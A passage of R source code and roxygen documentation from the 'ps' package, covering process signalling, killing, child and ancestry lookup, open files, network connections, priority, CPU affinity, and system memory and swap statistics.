    pids <- map_int(res[!ok], function(x) x[["pid"]] %||% NA_integer_)
    nms <- map_chr(p[!ok], function(pp) {
      tryCatch(ps_name(pp), error = function(e) "???")
    })
    pmsg <- paste0(pids, " (", nms, ")", collapse = ", ")
    # put these classes at the end
    common <- c("ps_error", "error", "condition")
    cls <- c(
      unique(setdiff(unlist(lapply(res[!ok], function(x) class(x))), common)),
      common
    )
    err <- structure(
      list(
        message = paste0(
          err_msg,
          if (length(p) == 1) ": " else " some processes: ",
          pmsg
        ),
        results = res,
        pid = pids
      ),
      class = cls
    )
    stop(err)
  }
}

#' Send signal to a process
#'
#' Send a signal to the process. Not implemented on Windows. See
#' [signals()] for the list of signals on the current platform.
#'
#' It checks if the process is still running, before sending the signal,
#' to avoid signalling the wrong process, because of pid reuse.
#'
#' @param p Process handle, or a list of process handles.
#' @param sig Signal number, see [signals()].
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps::ps_os_type()["POSIX"] && ! ps:::is_cran_check()
#' px <- processx::process$new("sleep", "10")
#' p <- ps_handle(px$get_pid())
#' p
#' ps_send_signal(p, signals()$SIGINT)
#' p
#' ps_is_running(p)
#' px$get_exit_status()

ps_send_signal <- function(p = ps_handle(), sig) {
  p <- assert_ps_handle_or_handle_list(p)
  assert_signal(sig)
  res <- lapply(p, function(pp) {
    tryCatch(
      .Call(psll_send_signal, pp, sig),
      error = function(e) e
    )
  })
  process_signal_result(p, res, "Failed to send signal to")
}

#' Suspend (stop) the process
#'
#' Suspend process execution with `SIGSTOP` preemptively checking
#' whether PID has been reused. On Windows this has the effect of
#' suspending all process threads.
#'
#' @param p Process handle or a list of process handles.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps::ps_os_type()["POSIX"] && ! ps:::is_cran_check()
#' px <- processx::process$new("sleep", "10")
#' p <- ps_handle(px$get_pid())
#' p
#' ps_suspend(p)
#' ps_status(p)
#' ps_resume(p)
#' ps_status(p)
#' ps_kill(p)

ps_suspend <- function(p = ps_handle()) {
  p <- assert_ps_handle_or_handle_list(p)
  res <- lapply(p, function(pp) {
    tryCatch(
      .Call(psll_suspend, pp),
      error = function(e) e
    )
  })
  process_signal_result(p, res, "Failed to suspend")
}

#' Resume (continue) a stopped process
#'
#' Resume process execution with SIGCONT preemptively checking
#' whether PID has been reused. On Windows this has the effect of resuming
#' all process threads.
#'
#' @param p Process handle or a list of process handles.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps::ps_os_type()["POSIX"] && ! ps:::is_cran_check()
#' px <- processx::process$new("sleep", "10")
#' p <- ps_handle(px$get_pid())
#' p
#' ps_suspend(p)
#' ps_status(p)
#' ps_resume(p)
#' ps_status(p)
#' ps_kill(p)

ps_resume <- function(p = ps_handle()) {
  p <- assert_ps_handle_or_handle_list(p)
  res <- lapply(p, function(pp) {
    tryCatch(
      .Call(psll_resume, pp),
      error = function(e) e
    )
  })
  process_signal_result(p, res, "Failed to resume")
}

#' Terminate a Unix process
#'
#' Send a `SIGTERM` signal to the process. Not implemented on Windows.
#'
#' Checks if the process is still running, to work around pid reuse.
#'
#' @param p Process handle or a list of process handles.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps::ps_os_type()["POSIX"] && ! ps:::is_cran_check()
#' px <- processx::process$new("sleep", "10")
#' p <- ps_handle(px$get_pid())
#' p
#' ps_terminate(p)
#' p
#' ps_is_running(p)
#' px$get_exit_status()

ps_terminate <- function(p = ps_handle()) {
  p <- assert_ps_handle_or_handle_list(p)
  res <- lapply(p, function(pp) {
    tryCatch(
      .Call(psll_terminate, pp),
      error = function(e) e
    )
  })
  process_signal_result(p, res, "Failed to terminate")
}

#' Kill one or more processes
#'
#' Kill the process with SIGKILL preemptively checking whether PID has
#' been reused. On Windows it uses `TerminateProcess()`.
#'
#' Note that since ps version 1.8, `ps_kill()` does not error if the
#' `p` process (or some processes if `p` is a list) are already terminated.
#'
#' @param p Process handle, or a list of process handles.
#' @param grace Grace period, in milliseconds, used on Unix. If it is not
#'   zero, then `ps_kill()` first sends a `SIGTERM` signal to all processes
#'   in `p`. If some proccesses do not terminate within `grace`
#'   milliseconds after the `SIGTERM` signal, `ps_kill()` kills them by
#'   sending `SIGKILL` signals.
#' @return Character vector, with one element for each process handle in
#'   `p`. If the process was already dead before `ps_kill()` tried to kill
#'   it, the corresponding return value is `"dead"`. If `ps_kill()` just
#'   killed it, it is `"killed"`.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ps::ps_os_type()["POSIX"] && ! ps:::is_cran_check()
#' px <- processx::process$new("sleep", "10")
#' p <- ps_handle(px$get_pid())
#' p
#' ps_kill(p)
#' p
#' ps_is_running(p)
#' px$get_exit_status()

ps_kill <- function(p = ps_handle(), grace = 200) {
  p <- assert_ps_handle_or_handle_list(p)
  grace <- assert_grace(grace)
  if (ps_os_type()[["WINDOWS"]]) {
    res <- lapply(p, function(pp) {
      tryCatch(
        {
          if (ps_is_running(pp)) {
            .Call(psll_kill, pp, 0L)
            "killed"
          } else {
            "dead"
          }
        },
        error = function(e) {
          if (inherits(e, "no_such_process")) "dead" else e
        }
      )
    })
  } else {
    res <- call_with_cleanup(psll_kill, p, grace)
  }

  process_signal_result(p, res, "Failed to kill")
}

#' List of child processes (process objects) of the process. Note that
#' this typically requires enumerating all processes on the system, so
#' it is a costly operation.
#'
#' @param p Process handle.
#' @param recursive Whether to include the children of the children, etc.
#' @return List of `ps_handle` objects.
#'
#' @family process handle functions
#' @export
#' @importFrom utils head tail
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_parent(ps_handle())
#' ps_children(p)

ps_children <- function(p = ps_handle(), recursive = FALSE) {
  assert_ps_handle(p)
  assert_flag(recursive)

  mypid <- ps_pid(p)
  mytime <- ps_create_time(p)
  map <- ps_ppid_map()
  ret <- list()

  if (!recursive) {
    for (i in seq_len(nrow(map))) {
      if (map$ppid[i] == mypid) {
        tryCatch(
          {
            child <- ps_handle(map$pid[i])
            if (mytime <= ps_create_time(child)) {
              ret <- c(ret, child)
            }
          },
          no_such_process = function(e) NULL,
          zombie_process = function(e) NULL
        )
      }
    }
  } else {
    seen <- integer()
    stack <- mypid
    while (length(stack)) {
      pid <- tail(stack, 1)
      stack <- head(stack, -1)
      if (pid %in% seen) {
        next
      } # nocov (happens _very_ rarely)
      seen <- c(seen, pid)
      child_pids <- map[map[, 2] == pid, 1]
      for (child_pid in child_pids) {
        tryCatch(
          {
            child <- ps_handle(child_pid)
            if (mytime <= ps_create_time(child)) {
              ret <- c(ret, child)
              stack <- c(stack, child_pid)
            }
          },
          no_such_process = function(e) NULL,
          zombie_process = function(e) NULL
        )
      }
    }
  }

  ## This will throw if p has finished
  ps_ppid(p)

  ret
}

#' Query the ancestry of a process
#'
#' Query the parent processes recursively, up to the first process.
#' (On some platforms, like Windows, the process tree is not a tree
#' and may contain loops, in which case `ps_descent()` only goes up
#' until the first repetition.)
#'
#' @param p Process handle.
#' @return A list of process handles, starting with `p`, each one
#' is the parent process of the previous one.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_descent()

ps_descent <- function(p = ps_handle()) {
  assert_ps_handle(p)
  windows <- ps_os_type()[["WINDOWS"]]

  branch <- list()
  branch_pids <- integer()
  current <- p
  current_pid <- ps_pid(p)
  if (windows) {
    current_time <- ps_create_time(p)
  }

  while (TRUE) {
    branch <- c(branch, list(current))
    branch_pids <- c(branch_pids, current_pid)
    parent <- fallback(ps_parent(current), NULL)

    # Might fail on Windows, if the process does not exist
    if (is.null(parent)) {
      break
    }

    # If the parent pid is the same, we stop.
    # Also, Windows might have loops
    parent_pid <- ps_pid(parent)
    if (parent_pid %in% branch_pids) {
      break
    }

    # Need to check for pid reuse on Windows
    if (windows) {
      parent_time <- ps_create_time(parent)
      if (current_time <= parent_time) {
        break
      }
      current_time <- parent_time
    }

    current <- parent
    current_pid <- parent_pid
  }

  branch
}

ps_ppid_map <- function() {
  pids <- ps_pids()

  processes <- not_null(lapply(pids, function(p) {
    tryCatch(ps_handle(p), error = function(e) NULL)
  }))

  pids <- map_int(processes, ps_pid)
  ppids <- map_int(processes, function(p) fallback(ps_ppid(p), NA_integer_))

  ok <- !is.na(ppids)

  data_frame(
    pid = pids[ok],
    ppid = ppids[ok]
  )
}

#' Number of open file descriptors
#'
#' Note that in some IDEs, e.g. RStudio or R.app on macOS, the IDE itself
#' opens files from other threads, in addition to the files opened from the
#' main R thread.
#'
#' For a zombie process it throws a `zombie_process` error.
#'
#' @param p Process handle.
#' @return Integer scalar.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' ps_num_fds(p)
#' f <- file(tmp <- tempfile(), "w")
#' ps_num_fds(p)
#' close(f)
#' unlink(tmp)
#' ps_num_fds(p)

ps_num_fds <- function(p = ps_handle()) {
  assert_ps_handle(p)
  .Call(psll_num_fds, p)
}

#' Open files of a process
#'
#' Note that in some IDEs, e.g. RStudio or R.app on macOS, the IDE itself
#' opens files from other threads, in addition to the files opened from the
#' main R thread.
#'
#' For a zombie process it throws a `zombie_process` error.
#'
#' @param p Process handle.
#' @return Data frame with columns: `fd` and `path`. `fd` is numeric
#'    file descriptor on POSIX systems, `NA` on Windows. `path` is an
#'    absolute path to the file.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' ps_open_files(p)
#' f <- file(tmp <- tempfile(), "w")
#' ps_open_files(p)
#' close(f)
#' unlink(tmp)
#' ps_open_files(p)

ps_open_files <- function(p = ps_handle()) {
  assert_ps_handle(p)

  l <- not_null(.Call(psll_open_files, p))

  d <- data_frame(
    fd = vapply(l, "[[", integer(1), 2),
    path = vapply(l, "[[", character(1), 1)
  )

  d
}

#' List network connections of a process
#'
#' For a zombie process it throws a `zombie_process` error.
#'
#' @param p Process handle.
#' @return Data frame, with columns:
#'    * `fd`: integer file descriptor on POSIX systems, `NA` on Windows.
#'    * `family`: Address family, string, typically `AF_UNIX`, `AF_INET` or
#'       `AF_INET6`.
#'    * `type`: Socket type, string, typically `SOCK_STREAM` (TCP) or
#'       `SOCK_DGRAM` (UDP).
#'    * `laddr`: Local address, string, `NA` for UNIX sockets.
#'    * `lport`: Local port, integer, `NA` for UNIX sockets.
#'    * `raddr`: Remote address, string, `NA` for UNIX sockets. This is
#'      always `NA` for `AF_INET` sockets on Linux.
#'    * `rport`: Remote port, integer, `NA` for UNIX sockets.
#'    * `state`: Socket state, e.g. `CONN_ESTABLISHED`, etc. It is `NA`
#'      for UNIX sockets.
#'
#' @family process handle functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' p <- ps_handle()
#' ps_connections(p)
#' sc <- socketConnection("httpbin.org", port = 80)
#' ps_connections(p)
#' close(sc)
#' ps_connections(p)

ps_connections <- function(p = ps_handle()) {
  assert_ps_handle(p)
  if (ps_os_type()[["LINUX"]]) {
    return(psl_connections(p))
  }

  l <- not_null(.Call(psll_connections, p))

  d <- data_frame(
    fd = vapply(l, "[[", integer(1), 1),
    family = match_names(
      ps_env$constants$address_families,
      vapply(l, "[[", integer(1), 2)
    ),
    type = match_names(
      ps_env$constants$socket_types,
      vapply(l, "[[", integer(1), 3)
    ),
    laddr = vapply(l, "[[", character(1), 4),
    lport = vapply(l, "[[", integer(1), 5),
    raddr = vapply(l, "[[", character(1), 6),
    rport = vapply(l, "[[", integer(1), 7),
    state = match_names(
      ps_env$constants$tcp_statuses,
      vapply(l, "[[", integer(1), 8)
    )
  )

  d$laddr[d$laddr == ""] <- NA_character_
  d$raddr[d$raddr == ""] <- NA_character_

  d$lport[d$lport == 0] <- NA_integer_
  d$rport[d$rport == 0] <- NA_integer_

  d
}

#' Interrupt a process
#'
#' Sends `SIGINT` on POSIX, and 'CTRL+C' or 'CTRL+BREAK' on Windows.
#'
#' @param p Process handle or a list of process handles.
#' @param ctrl_c On Windows, whether to send 'CTRL+C'. If `FALSE`, then
#'   'CTRL+BREAK' is sent. Ignored on non-Windows platforms.
#'
#' @family process handle functions
#' @export

ps_interrupt <- function(p = ps_handle(), ctrl_c = TRUE) {
  p <- assert_ps_handle_or_handle_list(p)
  assert_flag(ctrl_c)
  res <- lapply(p, function(pp) {
    tryCatch(
      {
        if (ps_os_type()[["WINDOWS"]]) {
          interrupt <- get_tool("interrupt")
          .Call(psll_interrupt, pp, ctrl_c, interrupt)
        } else {
          .Call(psll_interrupt, pp, ctrl_c, NULL)
        }
      },
      error = function(e) e
    )
  })
  process_signal_result(p, res, "Failed to interrupt")
}

#' @return `ps_windows_nice_values()` return a character vector of possible
#' priority values on Windows.
#' @export
#' @rdname ps_get_nice

ps_windows_nice_values <- function() {
  c("realtime", "high", "above_normal", "normal", "idle", "below_normal")
}

#' Get or set the priority of a process
#'
#' `ps_get_nice()` returns the current priority, `ps_set_nice()` sets a
#' new priority, `ps_windows_nice_values()` list the possible priority
#' values on Windows.
#'
#' Priority values are different on Windows and Unix.
#'
#' On Unix, priority is an integer, which is maximum 20. 20 is the lowest
#' priority.
#'
#' ## Rules:
#' * On Windows you can only set the priority of the processes the current
#'   user has `PROCESS_SET_INFORMATION` access rights to. This typically
#'   means your own processes.
#' * On Unix you can only set the priority of the your own processes.
#'   The superuser can set the priority of any process.
#' * On Unix you cannot set a higher priority, unless you are the superuser.
#'   (I.e. you cannot set a lower number.)
#' * On Unix the default priority of a process is zero.
#'
#' @param p Process handle.
#' @return `ps_get_nice()` returns a string from
#' `ps_windows_nice_values()` on Windows. On Unix it returns an integer
#' smaller than or equal to 20.
#'
#' @export

ps_get_nice <- function(p = ps_handle()) {
  assert_ps_handle(p)
  code <- .Call(psll_get_nice, p)
  if (ps_os_type()[["WINDOWS"]]) {
    ps_windows_nice_values()[code]
  } else {
    code
  }
}

#' @param value On Windows it must be a string, one of the values of
#' `ps_windows_nice_values()`. On Unix it is a priority value that is
#' smaller than or equal to 20.
#' @return `ps_set_nice()` return `NULL` invisibly.
#'
#' @export
#' @rdname ps_get_nice

ps_set_nice <- function(p = ps_handle(), value) {
  assert_ps_handle(p)
  assert_nice_value(value)
  if (ps_os_type()[["POSIX"]]) {
    value <- as.integer(value)
  } else {
    value <- match(value, ps_windows_nice_values())
  }
  invisible(.Call(psll_set_nice, p, value))
}

#' List the dynamically loaded libraries of a process
#'
#' Note: this function currently only works on Windows.
#' @param p Process handle.
#' @return Data frame with one column currently: `path`, the
#' absolute path to the loaded module or shared library. On Windows
#' the list includes the executable file itself.
#'
#' @export
#' @family process handle functions
#' @family shared library tools
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check() && ps::ps_os_type()[["WINDOWS"]]
#' # The loaded DLLs of the current process
#' ps_shared_libs()

ps_shared_libs <- function(p = ps_handle()) {
  assert_ps_handle(p)
  if (!ps_os_type()[["WINDOWS"]]) {
    stop("`ps_shared_libs()` is currently only supported on Windows")
  }

  l <- .Call(psll_dlls, p)

  d <- data_frame(
    path = map_chr(l, "[[", 1)
  )

  d
}

#' Query or set CPU affinity
#'
#' `ps_get_cpu_affinity()` queries the
#' [CPU affinity](https://www.linuxjournal.com/article/6799?page=0,0) of
#' a process. `ps_set_cpu_affinity()` sets the CPU affinity of a process.
#'
#' CPU affinity consists in telling the OS to run a process on a limited
#' set of CPUs only (on Linux cmdline, the `taskset` command is typically
#' used).
#'
#' These functions are only supported on Linux and Windows. They error on macOS.
#'
#' @param p Process handle.
#' @param affinity Integer vector of CPU numbers to restrict a process to.
#' CPU numbers start with zero, and they have to be smaller than the
#' number of (logical) CPUs, see [ps_cpu_count()].
#'
#' @return `ps_get_cpu_affinity()` returns an integer vector of CPU
#' numbers, starting with zero.
#'
#' `ps_set_cpu_affinity()` returns `NULL`, invisibly.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check() && ! ps::ps_os_type()[["MACOS"]]
#' # current
#' orig <- ps_get_cpu_affinity()
#' orig
#'
#' # restrict
#' ps_set_cpu_affinity(affinity = 0:0)
#' ps_get_cpu_affinity()
#'
#' # restore
#' ps_set_cpu_affinity(affinity = orig)
#' ps_get_cpu_affinity()

ps_get_cpu_affinity <- function(p = ps_handle()) {
  assert_ps_handle(p)
  type <- ps_os_type()
  if (!type[["LINUX"]] && !type[["WINDOWS"]]) {
    stop("`ps_cpu_affinity()` is only supported on Windows and Linux")
  }

  .Call(psll_get_cpu_aff, p)
}

#' @export
#' @rdname ps_get_cpu_affinity

ps_set_cpu_affinity <- function(p = ps_handle(), affinity) {
  assert_ps_handle(p)
  type <- ps_os_type()
  if (!type[["LINUX"]] && !type[["WINDOWS"]]) {
    stop("`ps_cpu_affinity()` is only supported on Windows and Linux")
  }

  # check affinity values
  cnt <- ps_cpu_count()
  stopifnot(is.integer(affinity), all(affinity < cnt))

  invisible(.Call(psll_set_cpu_aff, p, affinity))
}

#' Wait for one or more processes to terminate, with a timeout
#'
#' This function supports interruption with SIGINT on Unix, or CTRL+C
#' or CTRL+BREAK on Windows.
#'
#' @param p A process handle, or a list of process handles. The
#'   process(es) to wait for.
#' @param timeout Timeout in milliseconds. If -1, `ps_wait()` will wait
#'   indefinitely (or until it is interrupted). If 0, then it checks which
#'   processes have already terminated, and returns immediately.
#' @return Logical vector, with one value of each process in `p`.
#'   For processes that terminated it contains a `TRUE` value. For
#'   processes that are still running it contains a `FALSE` value.
#'
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check() && ps::ps_os_type()["POSIX"]
#' # this example calls `sleep`, so it only works on Unix
#' p1 <- processx::process$new("sleep", "100")
#' p2 <- processx::process$new("sleep", "100")
#'
#' # returns c(FALSE, FALSE) immediately if p1 and p2 are running
#' ps_wait(list(p1$as_ps_handle(), p2$as_ps_handle()), 0)
#'
#' # timeouts at one second
#' ps_wait(list(p1$as_ps_handle(), p2$as_ps_handle()), 1000)
#'
#' p1$kill()
#' p2$kill()
#' # returns c(TRUE, TRUE) immediately
#' ps_wait(list(p1$as_ps_handle(), p2$as_ps_handle()), 1000)

ps_wait <- function(p, timeout = -1) {
  p <- assert_ps_handle_or_handle_list(p)
  timeout <- assert_integer(timeout)
  call_with_cleanup(psll_wait, p, timeout)
}
````

### `pscheck/ps/R/macos.R`

````r
#' List currently running applications
#'
#' This function currently only works on macOS.
#'
#' @return A data frame with columns:
#'   - `pid`: integer process id.
#'   - `name`: process name.
#'   - `bundle_identifier`: bundle identifier, e.g. `com.apple.dock`.
#'   - `bundle_url`: bundle URL, a `file://` URL to the app bundle.
#'   - `arch`: executable architecture, possible values are
#'     `r paste(macos_archs$name, collapse = ", ")`.
#'   - `executable_url`: `file://` URL to the executable file.
#'   - `launch_date`: launch time stamp, a `POSIXct` object, may be `NA`.
#'   - `finished_launching`: whether the app has finished launching.
#'   - `active`: whether the app is active.
#'   - `activation_policy`: one of the following values:
#'     * `regular`: the application is an ordinary app that appears in the
#'       Dock and may have a user interface.
#'     * `accessory`: the application doesn’t appear in the Dock and
#'       doesn’t have a menu bar, but it may be activated programmatically
#'       or by clicking on one of its windows.
#'     * `prohibited`: the application doesn’t appear in the Dock and may
#'       not create windows or be activated.
#'
#' @export
#' @examplesIf ps_is_supported() && ps_os_type()[["MACOS"]] && !ps:::is_cran_check()
#' ps_apps()

ps_apps <- function() {
  if (!ps_os_type()[["MACOS"]]) {
    stop("'ps_apps()' is only implemented on macOS")
  }
  tab <- as_data_frame(.Call(ps__list_apps))

  tab <- tab[, c("pid", setdiff(names(tab), "pid"))]
  tab[["arch"]] <- macos_archs$name[match(tab[["arch"]], macos_archs$code)]
  tab[["launch_date"]] <- parse_iso_8601(
    sub(" +", "+", fixed = TRUE, tab[["launch_date"]])
  )
  # drop the ones without a pid, they are clearly (?) not running
  tab <- tab[tab$pid != -1, ]
  tab
}

macos_archs <- data.frame(
  name = c("arm64", "i386", "x86_64", "ppc", "ppc64"),
  code = c(0x0100000c, 0x00000007, 0x01000007, 0x00000012, 0x01000012)
)

ps_status_macos_ps <- function(pids) {
  stopifnot(is.integer(pids))
  suppressWarnings(tryCatch(
    {
      out <- system2(
        "/bin/ps",
        c("-o", "pid,stat", "-p", paste(pids, collapse = ",")),
        stdout = TRUE,
        stderr = FALSE
      )
      out <- out[-1]
      out <- trimws(out)
      out2 <- strsplit(out, " ")
      opids <- map_int(out2, function(x) as.integer(x[[1]]))
      state <- map_chr(out2, function(x) substr(x[[2]], 1, 1))
      state <- macos_process_states[state]
      unname(state[match(pids, opids)])
    },
    error = function(e) rep(NA_character_, length(pids))
  ))
}

# From `man 1 ps`
# I       Marks a process that is idle (sleeping for longer than about 20 seconds).
# R       Marks a runnable process.
# S       Marks a process that is sleeping for less than about 20 seconds.
# T       Marks a stopped process.
# U       Marks a process in uninterruptible wait.
# Z       Marks a dead process (a “zombie”).

macos_process_states <- c(
  I = "idle",
  R = "running",
  S = "sleeping",
  T = "stopped",
  U = "uninterruptible",
  Z = "zombie"
)
````

### `pscheck/ps/R/memoize.R`

````r
## nocov start
memoize <- function(fun) {
  fun
  cache <- NULL
  if (length(formals(fun)) > 0) {
    stop("Only memoizing functions without arguments")
  }
  dec <- function() {
    if (is.null(cache)) {
      cache <<- fun()
    }
    cache
  }
  attr(dec, "clear") <- function() cache <<- TRUE
  class(dec) <- c("memoize", class(dec))
  dec
}

`$.memoize` <- function(x, name) {
  switch(
    name,
    "clear" = attr(x, "clear"),
    stop("unknown memoize method")
  )
}
## nocov end
````

### `pscheck/ps/R/memory.R`

````r
#' Statistics about system memory usage
#'
#' @return Named list. All numbers are in bytes:
#' * `total`: total physical memory (exclusive swap).
#' * `avail` the memory that can be given instantly to processes without
#'   the system going into swap. This is calculated by summing different
#'   memory values depending on the platform and it is supposed to be used
#'   to monitor actual memory usage in a cross platform fashion.
#' * `percent`: Percentage of memory that is taken.
#' * `used`: memory used, calculated differently depending on
#'   the platform and designed for informational purposes only.
#'   `total` - `free` does not necessarily match `used`.
#' * `free`: memory not being used at all (zeroed) that is
#'   readily available; note that this doesn’t reflect the actual memory
#'   available (use `available` instead). `total` - `used` does not
#'   necessarily match `free`.
#' * `active`: (Unix only) memory currently in use or very recently used,
#'   and so it is in RAM.
#' * `inactive`: (Unix only) memory that is marked as not used.
#' * `wired`: (macOS only) memory that is marked to always stay in RAM. It
#'   is never moved to disk.
#' * `buffers`: (Linux only) cache for things like file system metadata.
#' * `cached`: (Linux only) cache for various things.
#' * `shared`: (Linux only) memory that may be simultaneously accessed by
#'   multiple processes.
#' * `slab`:  (Linux only) in-kernel data structures cache.
#'
#' @family memory functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_system_memory()

ps_system_memory <- function() {
  os <- ps_os_name()

  if (os == "MACOS") {
    l <- .Call(ps__system_memory)
    l$avail <- l$inactive + l$free
    l$used <- l$active + l$wired
    l$free <- l$free - l$speculative
    l$percent <- (l$total - l$avail) / l$total * 100
    l[c(
      "total",
      "avail",
      "percent",
      "used",
      "free",
      "active",
      "inactive",
      "wired"
    )]
  } else if (os == "LINUX") {
    ps__system_memory_linux()
  } else if (os == "WINDOWS") {
    l <- .Call(ps__system_memory)[c("total", "avail")]
    l$free <- l$avail
    l$used <- l$total - l$avail
    l$percent <- (l$total - l$avail) * 100 / l$total
    l[c("total", "avail", "percent", "used", "free")]
  } else {
    stop("ps is not supported in this platform")
  }
}

ps__system_memory_linux <- function() {
  tab <- read.table("/proc/meminfo", header = FALSE, fill = TRUE)
  mems <- structure(
    as.list(tab[[2]] * 1024),
    names = tolower(sub(":$", "", tab[[1]]))
  )

  total <- mems[["memtotal"]]
  free <- mems[["memfree"]]

  buffers <- mems[["buffers"]] %||% NA_real_
  cached <- mems[["cached"]] %||% NA_real_ + mems[["sreclaimable"]] %||% 0
  shared <- mems[["shmem"]] %||% mems[["memshared"]] %||% NA_real_
  active <- mems[["active"]] %||% NA_real_

  inactive <- mems[["inactive"]]
  if (is.null(inactive)) {
    inactive <-
      mems[["inact_dirty"]] + mems[["inact_clean"]] + mems[["inact_laundry"]]
  }
  if (length(inactive) == 0) {
    inactive <- NA_real_
  }

  slab <- mems[["slab"]] %||% 0

  used <- total - free - cached - buffers
  if (used < 0 || is.na(used)) {
    # May be symptomatic of running within a LCX container where such
    # values will be dramatically distorted over those of the host.
    used <- total - free
  }

  avail <- mems[["memavailable"]] %||% NA_real_

  # If avail is greater than total or our calculation overflows,
  # that's symptomatic of running within a LCX container where such
  # values will be dramatically distorted over those of the host.
  # https://gitlab.com/procps-ng/procps/blob/
  #     24fd2605c51fccc375ab0287cec33aa767f06718/proc/sysinfo.c#L764
  if (!is.na(avail) && avail > total) {
    avail <- free
  }

  percent <- (total - avail) / total * 100

  list(
    total = total,
    avail = avail,
    percent = percent,
    used = used,
    free = free,
    active = active,
    inactive = inactive,
    buffers = buffers,
    cached = cached,
    shared = shared,
    slab = slab
  )
}

#' System swap memory statistics
#'
#' @return Named list. All numbers are in bytes:
#' * `total`: total swap memory.
#' * `used`: used swap memory.
#' * `free`: free swap memory.
#' * `percent`: the percentage usage.
#' * `sin`: the number of bytes the system has swapped in from disk
#'   (cumulative). This is `NA` on Windows.
#' * `sout`: the number of bytes the system has swapped out from disk
#'   (cumulative). This is `NA` on Windows.
#'
#' @family memory functions
#' @export
#' @examplesIf ps::ps_is_supported() && ! ps:::is_cran_check()
#' ps_system_swap()

ps_system_swap <- function() {
  os <- ps_os_name()

  if (os == "MACOS") {
    l <- .Call(ps__system_swap)
    l$percent <- l$used / l$total * 100
    l[c("total", "used", "free", "percent", "sin", "sout")]
  } else if (os == "LINUX") {
    ps__system_swap_linux()
  } else if (os == "WINDOWS") {
    l <- .Call(ps__system_memory)
    total <- l[[3]]
    free <- l[[4]]
    used <- total - free
    percent <- used / total
    list(
      total = total,
      used = used,
      free = free,
      percent = percent,
      sin = NA_real_,
      sout = NA_real_
    )
  } else {
    stop("ps is not supported in this platform")
  }
}

ps__system_swap_linux <- function() {
  tab <- read.table("/proc/meminfo", header = FALSE, fill = TRUE)
  mems <- structure(
    as.list(tab[[2]] * 1024),
    names = tolower(sub(":$", "", tab[[1]]))
  )

  total <- mems[["swaptotal"]]
  free <- mems[["swapfree"]]
  used <- total - free
  percent <- used / total * 100
  sin <- sout <- 0

  tryCatch(
    {
      tab2 <- read.table("/proc/vmstat", header = FALSE)
      vms <- structure(as.list(tab2[[2]] * 4 * 1024), names = tab2[[1]])
      sin <- vms[["pswpin"]] %||% 0
      sout <- vms[["pswpout"]] %||% 0
    },
    error = function(e) NULL
  )

  list(
    total = total,
    used = used,
    free = free,
    percent = percent,
    sin = sin,
    sout = sout
  )
}
````

### `pscheck/ps/R/os.R`

````r
#' Query the type of the OS
#'
#' @return `ps_os_type` returns a named logical vector. The rest of the
#' functions return a logical scalar.
#'
#' `ps_is_supported()` returns `TRUE` if ps supports the current platform.
#'
#' @export
#' @examples
#' ps_os_type()
#' ps_is_supported()

ps_os_type <- function() {
  if (is.null(ps_env$os_type)) {
    ps_env$os_type <- .Call(ps__os_type)
  }
  ps_env$os_type
}

ps_os_name <- function() {
  os <- ps_os_type()
  os <- os[setdiff(names(os), c("BSD", "POSIX"))]
  names(os)[which(os)]
}

#' @rdname ps_os_type
#' @export

ps_is_supported <- function() {
  os <- ps_os_type()
  if (os[["LINUX"]]) {
    # On Linux we need to check if /proc is readable
    supported <- FALSE
    tryCatch(
      {
        readLines("/proc/stat", warn = FALSE, n = 1)
        supported <- TRUE
      },
      error = function(e) e
    )
    supported
  } else {
    os <- os[setdiff(names(os), c("BSD", "POSIX"))]
    any(os)
  }
}

supported_str <- function() {
  os <- ps_os_type()
  os <- os[setdiff(names(os), c("BSD", "POSIX"))]
  paste(caps(names(os)), collapse = ", ")
}
````

### `pscheck/ps/R/package.R`

````r
ps_env <- new.env(parent = emptyenv())

Internal <- NULL

## nocov start
.onLoad <- function(libname, pkgname) {
  ps_env$constants <- new.env(parent = emptyenv())
  .Call(ps__init, asNamespace("ps"), ps_env$constants)
  if (!is.null(ps_env$constants$signals)) {
    ps_env$constants$signals <- as.list(ps_env$constants$signals)
  }
  if (!is.null(ps_env$constants$errno)) {
    ps_env$constants$errno <- as.list(ps_env$constants$errno)
  }
  if (!is.null(ps_env$constants$address_families)) {
    ps_env$constants$address_families <-
      as.list(ps_env$constants$address_families)
  }
  if (!is.null(ps_env$constants$socket_types)) {
    ps_env$constants$socket_types <-
      as.list(ps_env$constants$socket_types)
  }

  Internal <<- get(".Internal", asNamespace("base"))

  ps_boot_time <<- memoize(ps_boot_time)
  ps_cpu_count_logical <<- memoize(ps_cpu_count_logical)
  ps_cpu_count_physical <<- memoize(ps_cpu_count_physical)
  get_terminal_map <<- memoize(get_terminal_map)
  NA_time <<- memoize(NA_time)
}
## nocov end

utils::globalVariables(c("self", "super"))
````

### `pscheck/ps/R/posix.R`

````r
#' List of all supported signals
#'
#' Only the signals supported by the current platform are included.
#' @return List of integers, named by signal names.
#'
#' @export

signals <- function() {
  as.list(ps_env$constants$signals)
}

get_terminal_map <- function() {
  ls <- c(
    dir("/dev", pattern = "^tty.*", full.names = TRUE),
    dir("/dev/pts", full.names = TRUE)
  )
  ret <- structure(ls, names = as.character(.Call(psp__stat_st_rdev, ls)))
  ret[names(ret) != "0"]
}
````

### `pscheck/ps/R/ps-package.R`

````r
#' @keywords internal
#' @aliases ps-package
"_PACKAGE"

## usethis namespace: start
## usethis namespace: end
NULL
````

### `pscheck/ps/R/ps.R`

````r
#' @useDynLib ps, .registration = TRUE
NULL

#' Process table
#'
